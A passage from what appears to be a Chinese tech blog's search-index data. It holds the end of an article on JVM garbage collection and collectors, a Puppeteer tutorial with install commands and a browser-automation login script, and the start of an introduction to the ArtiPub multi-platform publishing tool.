之前，虚拟机会先检查老年代最大可用的连续内存空间是否大于新生代所有对象总空间，如果这个条件成立，那么 Minor GC 可以确保是安全的。如果不成立，则虚拟机会查看 HandlePromotionFailure 的设置值是否允许担保失败。如果允许，那么会继续检查老年代最大可用的连续内存空间是否大于历次晋升到老年代对象的平均大小；如果大于，将尝试着进行一次 Minor GC，尽管这次 Minor GC 是有风险的；如果小于或者 HandlePromotionFailure 的设置不允许冒险，那这时也要改为进行一次 Full GC。新生代使用复制算法，但为了内存利用率，只使用其中一个 Survivor 空间来作为轮换备份，因此当出现大量对象在 Minor GC 后仍然存活的情况（最极端的情况就是内存回收后新生代中所有对象都存活），就需要老年代进行分配担保，把 Survivor 无法容纳的对象直接进入老年代。与生活中的贷款担保类似，老年代要进行这样的担保，前提是老年代本身还有容纳这些对象的剩余空间，一共有多少对象会活下来在实际完成内存回收之前是无法明确知道的，所以只好取之前每一次回收晋升到老年代对象容量的平均大小值作为经验值，与老年代的剩余空间进行比较，决定是否进行 Full GC 来让老年代腾出更多空间。使用平均值进行比较其实仍然是一种动态概率的手段，也就是说，如果某次 Minor GC 存活后的对象突增，远远高于平均值的话，依然会导致担保失败（Handle Promotion Failure）。如果出现了 HandlePromotionFailure 失败，那就只好在失败后重新发起一次 Full GC。虽然担保失败时绕的圈子是最大的，但大部分情况下都还是会将 HandlePromotionFailure 开关打开，避免 Full GC 过于频繁。 GC 的触发条件Minor GC 的触发条件对于 Minor GC，其触发条件非常简单，当新生代的 Eden 空间满时，就将触发一次 Minor GC。 Full GC 的触发条件调用 System.gc ()此方法的调用是建议 JVM 进行 Full GC，虽然只是建议而非一定，但很多情况下它会触发 Full GC，从而增加 Full GC 的频率，也即增加了间歇性停顿的次数。因此强烈建议能不使用此方法就不要使用，让虚拟机自己去管理它的内存，可通过 -XX:+ DisableExplicitGC 来禁止 RMI 调用 System.gc()。 老年代空间不足老年代空间不足的常见场景为大对象直接进入老年代、长期存活的对象进入老年代等，当执行 Full GC 后空间仍然不足，则抛出如下错误： Java.lang.OutOfMemoryError: Java heap space，为避免以上两种状况引起的 Full GC，调优时应尽量做到让对象在 Minor GC 阶段被回收、让对象在新生代多存活一段时间及不要创建过大的对象及数组。 空间分配担保失败在新生代使用复制算法的 Minor GC，需要老年代的内存空间作担保，如果出现了 HandlePromotionFailure 担保失败，则会触发 Full GC。 JDK 1.7 及以前的永久代空间不足在 JDK 1.7 及以前，HotSpot 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些类信息、静态变量、常量、常量池等数据，当系统中要加载的类、反射的类和调用的方法较多时，Permanet Generation 可能会被占满，在未配置为采用 CMS GC 的情况下也会执行 Full GC。如果经过 Full GC 仍然回收不了，那么 JVM 会抛出错误信息 java.lang.OutOfMemoryError: PermGen space，为避免 Permanet Generation 占满造成 Full GC 现象，可采用的方法为增大 Permanet Generation 空间或转为使用 CMS GC。在 JDK 1.8 中用元空间替换了永久代作为方法区的实现，元空间是本地内存，因此减少了一种 Full GC 触发的可能性。 Java 虚拟机规范里，使用方法区作为默认实现 JDK 1.7 及以前，HotSpot 虚拟机中的方法区使用永久代实现 JDK 1.8，HotSpot 虚拟机中的方法区使用元空间实现 Concurrent Mode Failure执行 CMS GC 的过程中同时有对象要放入老年代，而此时老年代空间不足（有时候空间不足是由于 CMS GC 执行时，当前的浮动垃圾过多导致暂时性的空间不足触发 Full GC），便会报 Concurrent Mode Failure 错误，并触发 Full GC。 JVM 垃圾收集器如果说垃圾收集算法是内存回收的方法论，那么垃圾收集器就是内存回收的具体实现。Java 虚拟机规范中对垃圾收集器应该如何实现并没有任何规定，因此不同的厂商、不同版本的虚拟机所提供的垃圾收集器都可能会有很大差别，并且一般都会提供参数供用户根据自己的应用特点和要求组合出各个年代所使用的垃圾收集器。下面的图中展示了 7 种作用于不同分代的垃圾收集器，如果两个收集器之间存在连线，就说明它们可以搭配使用。虚拟机所处的区域，则表示它是属于新生代收集器还是老年代收集器。 概念理解吞吐量 吞吐量就是 CPU 用于运行用户代码的时间与 CPU 总消耗时间的比值，即：吞吐量 = 运行用户代码时间 /（运行用户代码时间 + 垃圾收集时间） 虚拟机总共运行了 100 分钟，其中垃圾收集花掉 1 分钟，那吞吐量就是 99% 并发和并行 这两个名词都是并发编程中的概念，在谈论垃圾收集器的上下文语境中，它们的解释如下 并行（Parallel）：指多条垃圾收集线程并行工作，但此时用户线程仍然处于等待状态 并发（Concurrent）：指用户线程与垃圾收集线程同时执行（但不一定是并行的，可能会交替执行），用户程序在继续运行，而垃圾收集程序运行于另一个 CPU 核上 Minor GC 和 Full GC 新生代 GC（Minor GC）：指发生在新生代的垃圾收集动作，因为 Java 对象大多都具备朝生夕灭的特性，所以 Minor GC 非常频繁，一般回收速度也比较快 老年代 GC（Full GC / Major GC）：指发生在老年代的 GC，出现 Full GC 的时候，经常会伴随至少一次的 Minor GC（但非绝对的，在 Parallel Scavenge 收集器的收集策略里就有直接执行了 Full GC 的策略选择过程）。Full GC 的速度一般会比 Minor GC 慢 10 倍以上 新生代收集器Serial 收集器 Serial 收集器是最基本、发展历史最悠久的收集器，曾经（在 JDK 1.3.1 之前）是虚拟机新生代收集的唯一选择。 特性：这个收集器是一个单线程的收集器，但它的 “单线程” 的意义并不仅仅说明它只会使用一个 CPU 或一条收集线程去完成垃圾收集工作，更重要的是在它进行垃圾收集时，必须暂停其他所有的工作线程，直到它收集结束，即会造成 “Stop The World” 现象。 应用场景：Serial 收集器是虚拟机运行在 Client 模式下的默认新生代收集器。 优势：简单而高效（与其他收集器的单线程比），对于限定单个 CPU 的环境来说，Serial 收集器由于没有线程交互的开销，专心做垃圾收集自然可以获得最高的单线程收集效率。 ParNew 收集器 特性：ParNew 收集器其实就是 Serial 收集器的多线程版本，除了使用多条线程进行垃圾收集之外，其余行为包括 Serial 收集器可用的所有控制参数、收集算法、Stop The World、对象分配规则、回收策略等都与 Serial 收集器完全一样，在实现上，这两种收集器也共用了相当多的代码。 应用场景：ParNew 收集器是许多运行在 Server 模式下的虚拟机中首选的新生代收集器。很重要的原因是：除了 Serial 收集器外，目前只有它能与 CMS 收集器配合工作。在 JDK 1.5 时期，HotSpot 推出了一款在强交互应用中几乎可认为有划时代意义的垃圾收集器 - CMS 收集器，这款收集器是 HotSpot 虚拟机中第一款真正意义上的并发收集器，它第一次实现了让垃圾收集线程与用户线程同时工作。不幸的是，CMS 作为老年代的收集器，却无法与 JDK 1.4.0 中已经存在的新生代收集器 Parallel Scavenge 配合工作，所以在 JDK 1.5 中使用 CMS 来收集老年代的时候，新生代只能选择 ParNew 或者 Serial 收集器中的一个。 Serial 收集器 VS ParNew 收集器：ParNew 收集器在单 CPU 的环境中绝对不会有比 Serial 收集器更好的效果，甚至由于存在线程交互的开销，该收集器在通过超线程技术实现的两个 CPU 的环境中都不能百分之百地保证可以超越 Serial 收集器。然而，随着可以使用的 CPU 的数量的增加，它对于 GC 时系统资源的有效利用还是很有好处的。它默认开启的收集线程数与 CPU 的数量相同，在 CPU 非常多的情况下可使用 -XX:ParallerGCThreads 参数设置。 Parallel Scavenge 收集器特性：Parallel Scavenge 收集器是一个新生代收集器，它也是使用复制算法的收集器，又是并行的多线程收集器。 应用场景：停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验，而高吞吐量则可以高效率地利用 CPU 时间，尽快完成程序的运算任务，主要适合在后台运算而不需要太多交互的任务。 Parallel Scavenge 收集器 与 CMS 收集器：Parallel Scavenge 收集器的特点是它的关注点与其他收集器不同，CMS 等收集器的关注点是尽可能缩短垃圾收集时用户线程的停顿时间，而 Parallel Scavenge 收集器的目标是达到一个可控制的吞吐量（Throughput）。由于与吞吐量关系密切，Parallel Scavenge 收集器也经常称为 “吞吐量优先” 收集器。另外值得注意的一点是，Parallel Scavenge 收集器无法与 CMS 收集器配合使用，所以在 JDK 1.6 推出 Parallel Old 之前，如果新生代选择 Parallel Scavenge 收集器，老年代只有 Serial Old 收集器能与之配合使用。 Parallel Scavenge 收集器 VS ParNew 收集器：Parallel Scavenge 收集器与 ParNew 收集器的一个重要区别是，前者具有 GC 自适应调节策略特性。Parallel Scavenge 收集器除了会显而易见地提供可以精确控制吞吐量的参数，还提供了一个参数 -XX:+UseAdaptiveSizePolicy，这是一个开关参数，打开参数后就不需要手工指定新生代的大小（-Xmn）、Eden 和 Survivor 空间的比例（-XX:SurvivorRatio）、晋升老年代对象年龄（-XX:PretenureSizeThreshold）等细节参数了，虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量，这种方式称为 GC 自适应调节策略（GC Ergonomics）。 老年代收集器Serial Old 收集器 特性：Serial Old 是 Serial 收集器的老年代版本，它同样是一个单线程收集器，使用” 标记 - 整理算法”。 应用场景： Client 模式下，Serial Old 收集器的主要意义也是在于给 Client 模式下的虚拟机使用。 Server 模式下，主要有两大用途：一种用途是在 JDK 1.5 以及之前的版本中与 Parallel Scavenge 收集器搭配使用；另一种用途就是作为 CMS 收集器的后备预案，在并发收集发生 Concurrent Mode Failure 时使用。 Parallel Old 收集器 特性：Parallel Old 是 Parallel Scavenge 收集器的老年代版本，使用多线程和 “标记 - 整理” 算法。 应用场景：在注重吞吐量以及 CPU 资源敏感的场合，都可以优先考虑 Parallel Scavenge 加 Parallel Old 收集器。 Parallel Old 配合 Parallel Scavenge：Parallel Old 收集器是在 JDK 1.6 中才开始提供的，在此之前新生代的 Parallel Scavenge 收集器一直处于比较尴尬的状态。因为如果新生代选择了 Parallel Scavenge 收集器，老年代除了 Serial Old 收集器外别无选择（Parallel Scavenge 收集器无法与 CMS 收集器配合使用）。由于老年代 Serial Old 收集器在服务端应用性能上的 “拖累”，使用了 Parallel Scavenge 收集器也未必能在整体应用上获得吞吐量最大化的效果，由于单线程的老年代收集器（Serial Old）无法充分利用服务器多 CPU 的处理能力，在老年代很大而且硬件比较高级的环境中，这种组合的吞吐量甚至还不一定有 ParNew 加 CMS 的组合 “给力”。直到 Parallel Old 收集器出现后，“吞吐量优先” 收集器终于有了比较名副其实的应用组合。 CMS 收集器 特性：CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器。目前很大一部分的 Java 应用集中在互联网站或者 B/S 系统的服务端上，这类应用尤其重视服务的响应速度，希望系统停顿时间最短，以给用户带来较好的体验。CMS 收集器就非常符合这类应用的需求。 运作流程：CMS 收集器是基于 “标记 - 清除” 算法实现的，它的运作过程相对于前面几种收集器来说更复杂一些，整个过程分为以下 4 个步骤。由于在耗时最长的并发标记和并发清除整个过程中，收集器线程都可以与用户线程一起工作，所以从总体上来说，CMS 收集器的内存回收过程是与用户线程一起并发执行的。 初始标记（CMS initial mark）：初始标记仅仅只是标记一下 GC Roots 能直接关联到的对象，速度很快，需要 “Stop The World” 并发标记（CMS concurrent mark）：并发标记阶段就是进行 GC Roots Tracing 的过程 重新标记（CMS remark）：重新标记阶段是为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段稍长一些，但远比并发标记的时间短，仍然需要 “Stop The World” 并发清除（CMS concurrent sweep）：并发清除阶段会清除对象 优点CMS 是一款优秀的收集器，它的主要优点是并发收集、停顿时间短，因此 CMS 收集器也被称为” 并发低停顿收集器”（Concurrent Low Pause Collector）。 缺点： CMS 收集器对 CPU 资源非常敏感，其实面向并发设计的程序都对 CPU 资源比较敏感。在并发阶段，它虽然不会导致用户线程停顿，但是会因为占用了一部分线程（或者说 CPU 资源）而导致应用程序变慢，总吞吐量会降低。CMS 默认启动的回收线程数是（CPU 数量 + 3）/ 4，也就是当 CPU 在 4 个以上时，并发回收时垃圾收集线程不少于 25% 的 CPU 资源，并且随着 CPU 数量的增加而下降。但是当 CPU 不足 4 个（例如 2 个）时，CMS 对用户程序的影响就可能变得很大。 CMS 收集器无法处理浮动垃圾，可能出现 “Concurrent Mode Failure” 失败而导致另一次 Full GC 的产生。由于 CMS 并发清理阶段用户线程还在运行着，伴随程序运行自然就还会有新的垃圾不断产生，这一部分垃圾出现在标记过程之后，CMS 无法在当次收集中处理掉它们，只好留待下一次 GC 时再清理掉，这一部分垃圾就称为 “浮动垃圾”。也是由于在垃圾收集阶段用户线程还需要运行，那也就还需要预留有足够的内存空间给用户线程使用，因此 CMS 收集器不能像其他收集器那样等到老年代几乎完全被填满了再进行收集，需要预留一部分空间提供并发收集时的程序运作使用。要是 CMS 运行期间预留的内存无法满足程序需要，就会出现一次 “Concurrent Mode Failure” 失败，这时虚拟机将启动后备预案：临时启用 Serial Old 收集器来重新进行老年代的垃圾收集（Full GC），这样停顿时间就很长了。 CMS 收集器会产生大量空间碎片，CMS 是一款基于 “标记 - 清除” 算法实现的收集器，这意味着收集结束时会有大量空间碎片产生。空间碎片过多时，将会给大对象分配带来很大麻烦，往往会出现老年代还有很大空间剩余，但是无法找到足够大的连续内存空间来分配当前对象，导致不得不提前触发一次 Full GC。 G1 收集器 G1（Garbage-First）收集器是当今收集器技术发展最前沿的成果之一，它是一款面向服务端应用的垃圾收集器，HotSpot 开发团队赋予它的使命是（在比较长期的）未来可以替换掉 JDK 1.5 中发布的 CMS 收集器。 特性： 并行与并发：G1 能充分利用多 CPU、多核环境下的硬件优势，使用多个 CPU 来缩短 Stop-The-World 停顿的时间，部分其他收集器需要停顿 Java 线程来执行的 GC 动作，而 G1 收集器仍然可以通过并发的方式让 Java 程序继续执行。 分代收集：与其他收集器一样，分代概念在 G1 中依然得以保留。虽然 G1 可以不需要其他收集器配合就能独立管理整个 GC 堆，但它能够采用不同的方式去处理新创建的对象和已经存活了一段时间、熬过多次 GC 的旧对象以获取更好的收集效果。 空间整合：与 CMS 的 “标记 - 清除” 算法不同，G1 从整体来看是基于 “标记 - 整理” 算法实现的收集器，从局部（两个 Region 之间）上来看是基于 “复制” 算法实现的，但无论如何，这两种算法都意味着 G1 运作期间不会产生内存空间碎片，收集后能提供规整的可用内存。这种特性有利于程序长时间运行，分配大对象时不会因为无法找到连续内存空间而提前触发下一次 Full GC。 可预测的停顿：这是 G1 相对于 CMS 的另一大优势，降低停顿时间是 G1 和 CMS 共同的关注点，但 G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在垃圾收集上的时间不得超过 N 毫秒。 横跨整个堆内存：在 G1 之前的其他收集器进行收集的范围都是单独针对新生代或者老年代，而 G1 不再是这样。使用 G1 收集器时，Java 堆的内存布局就与其他收集器有很大差别，它将整个 Java 堆划分为多个大小相等的独立区域（Region），虽然还保留有新生代和老年代的概念，但新生代和老年代不再是物理隔离的了，它们都是一部分 Region（不需要连续）的集合。 建立可预测的时间模型：G1 收集器之所以能建立可预测的停顿时间模型，是因为它可以有计划地避免在整个 Java 堆中进行全区域的垃圾收集。G1 跟踪各个 Region 里面的垃圾堆积的价值大小（回收所获得的空间大小以及回收所需时间的经验值），在后台维护一个优先列表，每次根据允许的收集时间，优先回收价值最大的 Region（这也就是 Garbage-First 名称的来由）。这种使用 Region 划分内存空间以及有优先级的区域回收方式，保证了 G1 收集器在有限的时间内可以获取尽可能高的收集效率。 避免全堆扫描 - Remembered Set：G1 把 Java 堆分为多个 Region，就是 “化整为零”。但是 Region 不可能是孤立的，一个对象分配在某个 Region 中，可以与整个 Java 堆任意的对象发生引用关系。在做可达性分析确定对象是否存活的时候，需要扫描整个 Java 堆才能保证准确性，这显然是对 GC 效率的极大伤害。为了避免全堆扫描的发生，虚拟机为 G1 中每个 Region 维护了一个与之对应的 Remembered Set。虚拟机发现程序在对 Reference 类型的数据进行写操作时，会产生一个 Write Barrier 暂时中断写操作，检查 Reference 引用的对象是否处于不同的 Region 之中（在分代的例子中就是检查是否老年代中的对象引用了新生代中的对象），如果是便通过 CardTable 把相关引用信息记录到被引用对象所属的 Region 的 Remembered Set 之中。当进行内存回收时，在 GC 根节点的枚举范围中加入 Remembered Set 即可保证不对全堆扫描也不会有遗漏。 执行过程： 初始标记（Initial Marking）：初始标记阶段仅仅只是标记一下 GC Roots 能直接关联到的对象，并且修改 TAMS（Next Top at Mark Start）的值，让下一阶段用户程序并发运行时，能在正确可用的 Region 中创建新对象，这阶段需要停顿线程，但耗时很短。 并发标记（Concurrent Marking）：并发标记阶段是从 GC Root 开始对堆中对象进行可达性分析，找出存活的对象，这阶段耗时较长，但可与用户程序并发执行。 最终标记（Final Marking）：最终标记阶段是为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程 Remembered Set Logs 里面，最终标记阶段需要把 Remembered Set Logs 的数据合并到 Remembered Set 中，这阶段需要停顿线程，但是可并行执行。 筛选回收（Live Data Counting and Evacuation）：筛选回收阶段首先对各个 Region 的回收价值和成本进行排序，根据用户所期望的 GC 停顿时间来制定回收计划，这个阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分 Region，时间是用户可控制的，而且停顿用户线程将大幅提高收集效率。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java"},{title:"Puppeteer 入门使用教程",url:"/posts/1a44388b.html",text:'Puppeteer 介绍Puppeteer 是什么Puppeteer 是一个 NodeJs 库，它提供了一个高级 API 来通过 DevTools 协议控制 Chromium 或 Chrome。相比较 Selenium 或是 PhantomJs，它最大的特点就是完全可以在内存中模拟 DOM 操作，即在 V8 引擎中处理而不打开浏览器，而且关键的是该项目是 Chrome 团队在维护，会拥有更好的兼容性和前景，更多资料可参考以下站点：Puppeteer Github、Puppeteer 中文文档、DevTools Protocol 文档、Chromium 命令行启动参数。 Puppeteer 的功能 生成页面的截图和 PDF 自动提交表单，进行 UI 测试，键盘输入等 捕获网站的时间线跟踪，用来帮助分析性能问题 抓取 SPA（单页应用），并生成预渲染内容，即 “SSR”（服务器端渲染） 创建一个最新的自动化测试环境，使用最新的 JavaScript 和浏览器功能，直接在最新版本的 Chrome 中运行测试 测试浏览器扩展，Chrome / Chromium 扩展当前只能在非无头模式下使用，目前还无法测试扩展弹出窗口或内容脚本 Puppeteer VS Puppeteer-Core使用区别自 v1.7.0 以来的 Puppeteer 每个版本都会发布两个包：puppeteer、puppeteer-core，两者的区别如下： puppeteer 是浏览器自动化的产品，安装后它会下载一个最新版本的 Chromium，然后使用 puppeteer-core 驱动工作。作为最终用户产品，puppeteer 支持一堆方便的 PUPPETEER_* 环境变量来调整运行行为 puppeteer-core 是一个库来帮助驱动任何支持 DevTools 协议的东西。puppeteer-core 在安装时不会下载 Chromium，作为一个库，puppeteer-core 完全是通过其编程接口驱动的，并且会忽略所有 PUPPETEER_* 环境变量 使用建议在大多数情况下，可以使用 puppeteer 包，如果是下面这些情况，那可以使用 puppeteer-core： 正在构建使用 DevTools 协议的另一个最终用户产品或库；例如，可以使用 puppeteer-core 构建 PDF 生成器，并编写下载 headless_shell 的自定义 install.js 脚本，而不是使用 Chromium 来节省磁盘空间 正在打包 Puppeteer 用在 Chrome 上的扩展应用或者浏览器中以使用 DevTools 协议，因为下载额外的 Chromium 二进制文件不是必须的 当需要使用 puppeteer-core 时，使用下面这行代码代替原来的引入方式即可： 1const puppeteer = require(\'puppeteer-core\'); Puppeteer 运行环境与安装Puppeteer 运行环境Puppeteer 运行依赖于 NodeJs v6.4.0+，如果要使用 async /await，只有 NodeJs v7.6.0 或更高版本才支持，NodeJs 可以点击这里下载。 Puppeteer 安装Puppeteer 安装的过程默认会执行 install.js 脚本来下载最新版本的 Chromium（请自备梯子），可以使用 --ignore-scripts 参数跳过 Chromium 的下载，也可以通过设置环境变量 PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=1 来跳过下载。 12345# 安装puppeteer$ npm install puppeteer -g --ignore-scripts# 或者使用淘宝镜像源安装puppeteer$ npm install puppeteer -g --ignore-scripts --registry=https://registry.npm.taobao.org 手动下载 Chromium 并解压在本地磁盘，下载可以点击这里（请自备梯子）： Puppeteer 入门案例入门案例初始化项目： 1$ npm init 创建 index.js 文件，代码如下，executablePath 是 Chromium 或者 Chrome 可执行文件的路径： 123456789101112const puppeteer = require(\'puppeteer\');(async () =&gt; { const browser = await puppeteer.launch({ executablePath: \'/usr/bin/google-chrome-stable\', headless: false }); const page = await browser.newPage(); await page.goto(\'http://www.baidu.com/\'); await page.screenshot({path: \'baidu.png\'}); browser.close();})(); 执行 index.js 脚本，运行成功后，会在当前目录下生成网页的截图文件 baidu.png： 1$ node index.js 启动参数Puppeteer Launch 的启动参数如下： executablePath：Chromium 或 Chrome 可执行文件的路径 headless：是否运行在浏览器 headless 模式，true 表示不打开浏览器执行，默认为 true timeout：等待浏览器实例启动的最长时间（以毫秒为单位），默认为 30000，当值为 0 时表示禁用超时 args：传递给浏览器实例的其他参数 Puppeteer 实战Puppeteer 环境变量Puppeteer 的环境变量如下，在使用 puppeteer-core 时，下述环境变量中以 PUPPETEER_* 开头的会被忽略： HTTP_PROXY、HTTPS_PROXY, NO_PROXY - 定义用于下载和运行 Chromium 的 HTTP 代理设置 PUPPETEER_SKIP_CHROMIUM_DOWNLOAD - 请勿在安装步骤中下载绑定的 Chromium PUPPETEER_DOWNLOAD_HOST - 覆盖用于下载 Chromium 的 URL 的主机部分 PUPPETEER_CHROMIUM_REVISION - 在安装步骤中指定一个 puppeteer 使用的特定版本的 Chromium PUPPETEER_EXECUTABLE_PATH - 指定一个 Chrome 或者 Chromium 可执行文件的路径，会被用于 puppeteer.launch Puppeteer 的选择器Puppeteer 中获取元素的方法和浏览器里面的一样，但是获取元素的属性的办法和浏览器不一样，它有一套 API 用来获取界面中的元素，还有一套 API 用来获取元素的属性。 获取元素的操作如下： 12345// Page.$(selector) 获取单个元素，底层是调用的是 document.querySelector()，所以选择器的 selector 格式遵循 CSS 选择器规范let inputElement = await page.$(\'#search\');// Page.$$(selector) 获取一组元素，底层调用的是 document.querySelectorAll()，返回 Promise(Array(ElemetHandle)) 元素数组const links = await page.$$("a"); 获取元素的属性的操作如下： 1234567// Puppeteer 获取元素属性跟平时写 JavaScript 的逻辑有点不一样，按照通常的逻辑，应该是现获取元素，然后再获取元素的属性// Puppeteer 获取元素的 API 最终返回的都是 ElemetHandle 对象，而 ElemetHandle 并没有提供获取元素属性的 API，而 Puppeteer 专门提供了一套获取元素属性的 API，分别是： Page.$eval() 和 Page.$$eval()const href = await page.$eval(\'#a\', ele =&gt; ele.href);const content = await page.$eval(\'.content\', ele =&gt; ele.outerHTML);const value = await page.$eval(\'input[name=search]\', input =&gt; input.value);const textArray = await page.$$eval(\'#dom\', els =&gt; Array.from(els).map(el =&gt; el.textContent)); 常用的元素选择器： 选择器 示例 示例说明 id 选择器 #id 选择匹配 id 的元素，仅存在一个 class 选择器 .class 同时匹配多个 class 元素 属性选择器 div[attr] 匹配具有 attr 的属性，不考虑具体的值 属性选择器 div[attr=‘122‘] 匹配具有 attr 的属性，值为 122 后代选择器 div span 后代选择器，匹配所有 div 后面的 span 标签，div 与 span 之间用空格隔开 子元素选择器 div &gt; span 子元素选择器，匹配 div 后所有的 span 匹配父元素下的第 n 个子元素 div:nth-child(2) 匹配父元素下的第 2 个元素 SegmentFault 模拟登录123456789101112131415161718192021222324252627const puppeteer = require(\'puppeteer\');(async () =&gt; { const browser = await puppeteer.launch({ executablePath: \'/usr/bin/google-chrome-stable\', headless: false }); const page = await browser.newPage(); page.setJavaScriptEnabled(true); page.setCacheEnabled(true); await page.goto("https://segmentfault.com/user/login", { "timeout" : 30000 }); // 选择登录方式 await page.tap(".login-nav &gt; a[data-mode=\'password\']"); // 输入用户名 await page.type("form[class=\'password-form\'] &gt; div &gt; input[name=\'username\']", \'admin\', {delay:100}); // 输入密码 await page.type("form[class=\'password-form\'] &gt; div &gt; input[name=\'password\']", \'123456\', {delay:100}); // 点击登录按钮 await page.tap("form[class=\'password-form\'] &gt; button[type=\'submit\']"); // await page.close(); // await browser.close();})(); Puppeteer 结合 Jest 使用Puppeteer 周边的开源项目 jvppeteer，Java 版的 Puppeteer pyppeteer，Python 版的 Puppeteer awesome-puppeteer，Puppeteer 相关的开源项目整理 docker-puppeteer，A minimal Docker image for Puppeteer puppeteer-cluster，Puppeteer Pool, run a cluster of instances in parallel puppeteer-deep，爬取《es6 标准入门》、自动推文到掘金、站点性能分析；高级爬虫、自动化 UI 测试、性能分析的实践案例 puppeteer-recorder，Puppeteer recorder is a Chrome extension that records your browser interactions and generates a Puppeteer script var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"爬虫 前端"},{title:"ArtiPub 一款开源的一文多发平台",url:"/posts/5987f4b4.html",text:'前言很多优秀的程序员和技术人员喜欢写技术文章和技术博客，通过这样的方式分享传播知识和经验，扩大自己的知名度和影响力，吸引粉丝关注，甚至有些技术博主还通过写文章来获取广告收入，还通过这种方法获得了出版书的机会以及工作机会。因此，写技术文章是一件非常值得投入的事情，帮助了自己，也让大众受益。但是，写技术文章通常也很耗时，特别是一些优质文章，不仅需要旁征博引、构思文章结构、照顾读者受众，还需要做很多前期工作，例如搭建环境、写 Demo 代码、测试代码等等。一篇优质技术文章通常需要 3-6 个小时来完成，可花了很多时间来写文章，最终发布出来的文章得不到很多人的关注是一件相当令人沮丧的事情。因此，优质文章值得获取关注和传播，让更多的技术工作者通过阅读文章获取知识获益。每个技术博主都有自己喜欢的技术媒体平台，例如简书、知乎、掘金、CSDN、微信公众号等等。很多技术博主也喜欢将文章发布在不同的平台上，寻求最大的关注度，同时也防止自己辛辛苦苦写的文章被别人复制粘贴盗版过去。然而，在多个平台上发文是一件麻烦的事情：博主需要同时登陆多个媒体平台，将自己的文章复制一个一个粘贴过去；更麻烦的是，有些平台只支持 Markdown，有些平台只支持富文本，博主需要在这两者之间来回转换，这增加了工作量。一文多发平台 ArtiPub 就解决了这样的问题，下面将介绍开源的一文多发平台 ArtiPub。 ArtiPub 简介ArtiPub（Article Publisher 的简称，意为” 文章发布者”）是一款开源的一文多发平台，可以帮助文章作者将编写好的文章自动发布到简书、掘金、SegmentFault、CSDN、知乎、开源中国等技术媒体平台，传播优质知识，获取最大的曝光度。ArtiPub 安装简单，提供了多种安装方式（Docker、NPM、源码），可以一键安装使用，安装一般只要 5 分钟。ArtiPub 目前支持文章编辑、文章发布、数据统计的功能，后期会加入存量文章导入、数据分析的功能。此外，ArtiPub 日后还会接入更多媒体渠道，真正做到让文章随处可阅。用户使用 ArtiPub 也很简单，只需要在浏览器上打开 ArtiPub 的 Web 界面，将文章以 Markdown 的形式输入到编辑器，然后点击一键发布，等待不到 1 分钟，文章就自动同步到各大技术媒体平台了。此外，文章的阅读、点赞、评论数据还将周期性的被同步回来，让作者可以近实时看到文章的传播情况。 ArtiPub 原理简介ArtiPub 的底层原理并不复杂，简单来说就是利用了爬虫技术将文章发布到各大平台。ArtiPub 的爬虫是用了 Google 开源的自动化测试工具 Puppeteer，这个工具不仅可以获取需要有 ajax 动态内容的数据，还可以来做一些模拟操作，作用类似于 Selenium，但更强大。如何进行登陆操作呢？其实 ArtiPub 是通过 Chrome 插件获取了用户登陆信息（Cookie），将 Cookie 注入到由 Puppeteer 操作的 Chromium 浏览器中，然后浏览器就可以正常登陆网站进行发文操作了。Cookie 是保存在用户自己搭建的 MongoDB 数据库里，不对外暴露，因此很安全。 ArtiPub 的架构示意图如下： 架构原理简介如下： 后端（Backend）是整个架构的中枢，负责给前端交换数据、储存读取数据库、控制爬虫、收集 Cookie 等 Chrome 插件（Chrome Extension）只负责从网站（Sites）获取 Cookie 爬虫（Spiders）被后端控制，负责在网站上发布文章和抓取数据 数据库（MongoDB）负责储存数据（Cookie） 前端（Frontend）是一个 React 应用，基于 Ant Design Pro 改造而来 ArtiPub 支持的平台 掘金 SegmentFault CSDN 简书 知乎 开源中国 今日头条 博客园 微博 百度百家号 51CTO 开发者头条 微信公众号 ArtiPub 与其他平台比较市面上已经存在一文多发的商业平台了，为何还要创建 ArtiPub 呢？或许其他一文多发平台也是一个替代方案，但它们要求用户将自己的账户信息，例如 Cookie 或账号密码上传到对方服务器，这很不安全，一旦平台发生问题，自己的账户信息会遭到泄漏。虽然一般的平台不会恶意操作用户的账户，但如果出现误操作或者黑客攻击，用户的账户信息将遭到泄漏，平台上的财产也可能遭到损坏。ArtiPub 不要求用户上传账户信息，所有账户信息全部保存在用户自己的数据库里，因此规避了这个安全风险。另外，由于 ArtiPub 是基于 JS 开源的，JS 源码也比较易于理解，可扩展性很强，用户如果有其他平台的接入需求，完全可以通过更改源码来实现自己的需求，不用等待平台更新。官方的开发组也将持续开发 ArtiPub，将其打造得更实用和易用。 ArtiPub 安装Docker 安装 ArtiPub 软件依赖 软件版本 Docker 18.03 Docker Compose 1.24.1 通过 Docker，可以免去手动安装 MongoDB 的步骤，这是最推荐的安装方式。使用 Docker 安装 